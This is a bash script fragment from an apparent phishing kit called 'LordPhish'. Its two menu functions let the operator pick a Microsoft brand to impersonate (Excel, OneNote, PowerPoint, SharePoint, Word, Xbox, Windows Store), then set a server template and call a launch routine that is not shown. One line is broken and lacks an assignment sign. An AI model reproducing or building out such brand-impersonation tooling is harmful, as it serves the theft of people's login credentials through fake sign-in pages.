#!/usr/bin/env bash

microsoft_ofice() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Excel\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' ofice_menu
    if [[ $ofice_menu == 1 || $ofice_menu == 01 ]]; then
    server="exel"
    start1
    elif [[ $ofice_menu == 2 || $ofice_menu == 02 ]]; then
        server="onenote"
        start1
        elif [[ $ofice_menu == 3 || $ofice_menu == 03 ]]; then
            server="powerpoint"
            start1
            elif [[ $ofice_menu == 4 || $ofice_menu == 04 ]]; then
                server="sharepoint"
                start1
                elif [[ $ofice_menu == 5 || $ofice_menu == 05 ]]; then
                    server="word"
                    start1
                    else
                        printf "\e[1;93m [!] Invalid option!\e[0m\n"
                        menu
                        fi
}


microsoft () {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m XBOX\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Windows Store\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    
if [[ $op_menu == 1 ]]; then
    server="xbox"
    start1
    elif [[ $op_menu == 2 ]]; then
        server"Microsoft"
        start1
        else
            printf "\e[1;93m [!] Invalid option!\e[0m\n"
            menu
            fi
}
